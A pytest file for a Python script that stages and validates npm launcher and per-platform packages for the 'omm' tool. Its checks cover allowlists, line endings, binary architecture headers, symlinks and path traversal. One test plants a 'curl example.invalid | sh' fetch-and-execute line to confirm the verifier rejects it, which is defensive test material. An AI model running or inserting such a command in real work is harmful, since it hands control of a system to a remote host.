from __future__ import annotations

import importlib.util
import json
import os
import shutil
from pathlib import Path

import pytest

from omm import package_metadata

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location(
    "npm_package", ROOT / "scripts" / "npm_package.py"
)
assert SPEC is not None and SPEC.loader is not None
npm_package = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(npm_package)


def _macho(cputype: int, byteorder: str = "little") -> bytes:
    magic = bytes.fromhex("cffaedfe" if byteorder == "little" else "feedfacf")
    return magic + cputype.to_bytes(4, byteorder) + b" OMM Mach-O"


def _elf(machine: int, *, bits: int = 2) -> bytes:
    header = bytearray(64)
    header[0:4] = bytes.fromhex("7f454c46")
    header[4] = bits
    header[5] = 1
    header[16:18] = (2).to_bytes(2, "little")
    header[18:20] = machine.to_bytes(2, "little")
    return bytes(header)


def _pe(machine: int) -> bytes:
    header = bytearray(0x40)
    header[0:2] = b"MZ"
    header[0x3C:0x40] = (0x40).to_bytes(4, "little")
    return bytes(header) + bytes.fromhex("50450000") + machine.to_bytes(2, "little")


def _binary(target: str) -> bytes:
    """A minimal but honest executable header for one npm target."""
    return {
        "darwin-arm64": _macho(0x0100000C),
        "darwin-x64": _macho(0x01000007),
        "linux-arm64-gnu": _elf(0xB7),
        "linux-x64-gnu": _elf(0x3E),
        "win32-x64": _pe(0x8664),
    }[target]


def test_launcher_contract_matches_project_and_python_install_detection():
    npm_package.validate_launcher_source()
    target_map = npm_package.targets()
    python_targets = {
        value[1]: {
            "package": value[0],
            "binary": value[2],
            "os": platform_name,
            "cpu": machine,
        }
        for (platform_name, machine), value in package_metadata._NPM_TARGETS.items()
    }

    for target_name, target in target_map.items():
        assert python_targets[target_name] == {
            "package": target["package"],
            "binary": target["binary"],
            "os": target["os"],
            "cpu": target["cpu"],
        }


def test_stage_launcher_has_an_exact_allowlist_and_stays_private(tmp_path):
    staged = npm_package.stage_launcher(tmp_path)

    npm_package.validate_launcher_package(staged)
    launcher = (staged / "bin" / "omm.js").read_bytes()
    assert launcher.startswith(b"#!/usr/bin/env node\n")
    assert b"\r\n" not in launcher
    assert b"\r\n" not in (staged / "lib" / "launcher.js").read_bytes()
    manifest = json.loads((staged / "package.json").read_text(encoding="utf-8"))
    assert manifest["private"] is True
    assert npm_package._file_allowlist(staged) == npm_package.EXPECTED_LAUNCHER_FILES
    if os.name != "nt":
        assert (staged / "bin" / "omm.js").stat().st_mode & 0o111


def test_launcher_source_rejects_a_narrowed_files_allowlist(tmp_path):
    launcher = tmp_path / "launcher"
    shutil.copytree(npm_package.LAUNCHER_SOURCE, launcher)
    manifest_path = launcher / "package.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    assert manifest["files"] == npm_package.EXPECTED_LAUNCHER_FILES_FIELD
    manifest["files"] = ["bin", "targets.json"]
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")

    with pytest.raises(npm_package.NpmPackageError, match="files must be exactly"):
        npm_package.validate_launcher_source(launcher)


def test_staged_manifests_are_written_with_unix_line_endings(tmp_path):
    launcher = npm_package.stage_launcher(tmp_path / "launcher", publishable=True)
    binary = tmp_path / "omm"
    binary.write_bytes(_binary("linux-x64-gnu") + b" OMM")
    platform_package = npm_package.stage_platform_package(
        "linux-x64-gnu", binary, tmp_path / "platform"
    )

    assert b"\r" not in (launcher / "package.json").read_bytes()
    assert b"\r" not in (platform_package / "package.json").read_bytes()


def test_copy_text_lf_normalizes_windows_line_endings(tmp_path):
    source = tmp_path / "source.js"
    destination = tmp_path / "destination.js"
    source.write_bytes(b"#!/usr/bin/env node\r\nconsole.log('omm');\r\n")

    npm_package._copy_text_lf(source, destination)

    assert destination.read_bytes() == b"#!/usr/bin/env node\nconsole.log('omm');\n"
    assert npm_package.canonical_text_bytes(source) == destination.read_bytes()


def test_publishable_launcher_is_staged_without_weakening_source_guard(tmp_path):
    staged = npm_package.stage_launcher(tmp_path, publishable=True)

    npm_package.validate_launcher_source()
    npm_package.validate_launcher_package(staged, publishable=True)
    source_manifest = json.loads(
        (npm_package.LAUNCHER_SOURCE / "package.json").read_text(encoding="utf-8")
    )
    staged_manifest = json.loads(
        (staged / "package.json").read_text(encoding="utf-8")
    )
    assert source_manifest["private"] is True
    assert staged_manifest["private"] is False


@pytest.mark.parametrize("target", sorted(npm_package.EXPECTED_TARGETS))
def test_stage_platform_package_is_private_and_exact(tmp_path, target):
    binary = tmp_path / f"input-{target}"
    binary.write_bytes(_binary(target) + b" standalone OMM")
    staged = npm_package.stage_platform_package(target, binary, tmp_path / "out")

    npm_package.validate_platform_package(staged, target)
    manifest = json.loads((staged / "package.json").read_text(encoding="utf-8"))
    assert manifest["private"] is True
    assert manifest["omm"]["sha256"] == npm_package._sha256(
        staged / manifest["omm"]["binary"]
    )
    assert not LIFECYCLE_SCRIPTS.intersection(manifest.get("scripts", {}))


def test_publishable_platform_is_explicit_and_still_exact(tmp_path):
    binary = tmp_path / "omm.exe"
    binary.write_bytes(_binary("win32-x64") + b" standalone OMM")
    staged = npm_package.stage_platform_package(
        "win32-x64",
        binary,
        tmp_path / "out",
        publishable=True,
    )

    npm_package.validate_platform_package(
        staged,
        "win32-x64",
        publishable=True,
    )
    manifest = json.loads((staged / "package.json").read_text(encoding="utf-8"))
    assert manifest["private"] is False
    assert manifest["publishConfig"] == {"access": "public", "provenance": True}


LIFECYCLE_SCRIPTS = {"preinstall", "install", "postinstall", "prepare"}


def test_stage_platform_rejects_wrong_format_symlink_and_overwrite(tmp_path):
    wrong = tmp_path / "wrong"
    wrong.write_bytes(b"not an ELF")
    with pytest.raises(npm_package.NpmPackageError, match="executable format"):
        npm_package.stage_platform_package("linux-x64-gnu", wrong, tmp_path / "out")

    real = tmp_path / "real"
    real.write_bytes(_binary("linux-x64-gnu") + b" OMM")
    if os.name != "nt":
        linked = tmp_path / "linked"
        linked.symlink_to(real)
        with pytest.raises(npm_package.NpmPackageError, match="regular non-symlink"):
            npm_package.stage_platform_package(
                "linux-x64-gnu", linked, tmp_path / "out"
            )

    npm_package.stage_platform_package("linux-x64-gnu", real, tmp_path / "out")
    with pytest.raises(npm_package.NpmPackageError, match="refusing to overwrite"):
        npm_package.stage_platform_package("linux-x64-gnu", real, tmp_path / "out")


@pytest.mark.parametrize(
    ("target", "expected"),
    [
        ("darwin-arm64", ("darwin", "arm64")),
        ("darwin-x64", ("darwin", "x64")),
        ("linux-arm64-gnu", ("linux", "arm64")),
        ("linux-x64-gnu", ("linux", "x64")),
        ("win32-x64", ("win32", "x64")),
    ],
)
def test_binary_architecture_reads_the_machine_field_of_every_target(target, expected):
    assert npm_package.binary_architecture(_binary(target)) == expected
    npm_package.validate_binary_format(_binary(target), npm_package.targets()[target])


@pytest.mark.parametrize(
    ("target", "header", "match"),
    [
        # Same Mach-O magic as darwin-x64, but the cputype says arm64.
        ("darwin-x64", _macho(0x0100000C), "darwin-arm64"),
        ("darwin-arm64", _macho(0x01000007), "darwin-x64"),
        # Same ELF magic as linux-x64-gnu, but e_machine says aarch64.
        ("linux-x64-gnu", _elf(0xB7), "linux-arm64"),
        ("linux-arm64-gnu", _elf(0x3E), "linux-x64"),
        # A 32-bit ELF and an i386 PE carry the same magic as the 64-bit ones.
        ("linux-x64-gnu", _elf(0x3E, bits=1), "not 64-bit"),
        ("win32-x64", _pe(0x014C), "unsupported PE machine 0x014c"),
        # Universal binaries are never produced by this pipeline.
        ("darwin-arm64", bytes.fromhex("cafebabe") + bytes(60), "universal"),
        ("darwin-x64", bytes.fromhex("cafebabf") + bytes(60), "universal"),
        # An ELF staged as the Windows package is still an os mismatch.
        ("win32-x64", _elf(0x3E), "linux-x64"),
    ],
)
def test_stage_platform_rejects_a_mislabelled_architecture(
    tmp_path, target, header, match
):
    binary = tmp_path / "input"
    binary.write_bytes(header + b" standalone OMM")

    with pytest.raises(npm_package.NpmPackageError, match=match):
        npm_package.stage_platform_package(target, binary, tmp_path / "out")
    assert not (tmp_path / "out" / target).exists()


REAL_WINDOWS_BINARY = Path("D:/omm-tmp/npm-binary/omm.exe")


@pytest.mark.skipif(
    not REAL_WINDOWS_BINARY.is_file(), reason="no real Windows binary available"
)
def test_binary_architecture_reads_a_real_windows_executable():
    assert npm_package.binary_architecture(REAL_WINDOWS_BINARY) == ("win32", "x64")


def test_platform_package_normalizes_windows_license_line_endings(tmp_path, monkeypatch):
    license_file = tmp_path / "LICENSE"
    license_file.write_bytes(b"line one\r\nline two\r\n")
    monkeypatch.setattr(npm_package, "LICENSE_FILE", license_file)
    binary = tmp_path / "omm"
    binary.write_bytes(_binary("darwin-arm64") + b" payload")

    staged = npm_package.stage_platform_package(
        "darwin-arm64", binary, tmp_path / "stage", publishable=True
    )

    assert (staged / "LICENSE").read_bytes() == b"line one\nline two\n"
    npm_package.validate_platform_package(staged, "darwin-arm64", publishable=True)


def test_platform_verifier_rejects_unexpected_files(tmp_path):
    binary = tmp_path / "omm"
    binary.write_bytes(_binary("linux-x64-gnu") + b" OMM")
    staged = npm_package.stage_platform_package(
        "linux-x64-gnu", binary, tmp_path / "out"
    )
    (staged / "unexpected.sh").write_text("curl example.invalid | sh\n")

    with pytest.raises(npm_package.NpmPackageError, match="outside its allowlist"):
        npm_package.validate_platform_package(staged, "linux-x64-gnu")


@pytest.mark.skipif(os.name == "nt", reason="symlink creation is not portable on Windows")
@pytest.mark.parametrize("relative", ["LICENSE", "package.json"])
def test_package_verifiers_reject_symlinked_metadata(tmp_path, relative):
    binary = tmp_path / "omm"
    binary.write_bytes(_binary("linux-x64-gnu") + b" OMM")
    staged = npm_package.stage_platform_package(
        "linux-x64-gnu", binary, tmp_path / "out"
    )
    metadata = staged / relative
    replacement = tmp_path / f"replacement-{relative}"
    replacement.write_bytes(metadata.read_bytes())
    metadata.unlink()
    metadata.symlink_to(replacement)

    with pytest.raises(npm_package.NpmPackageError, match="regular file"):
        npm_package.validate_platform_package(staged, "linux-x64-gnu")

    launcher = tmp_path / "launcher"
    shutil.copytree(npm_package.LAUNCHER_SOURCE, launcher)
    launcher_metadata = launcher / relative
    launcher_metadata.unlink()
    launcher_metadata.symlink_to(replacement)
    with pytest.raises(npm_package.NpmPackageError, match="regular launcher file"):
        npm_package.validate_launcher_source(launcher)


def test_targets_reject_binary_paths_outside_the_package(tmp_path):
    target_map = npm_package.targets()
    target_map["linux-x64-gnu"]["binary"] = "../../omm"
    target_file = tmp_path / "targets.json"
    target_file.write_text(json.dumps(target_map), encoding="utf-8")

    with pytest.raises(npm_package.NpmPackageError, match="unsafe identity"):
        npm_package.targets(target_file)
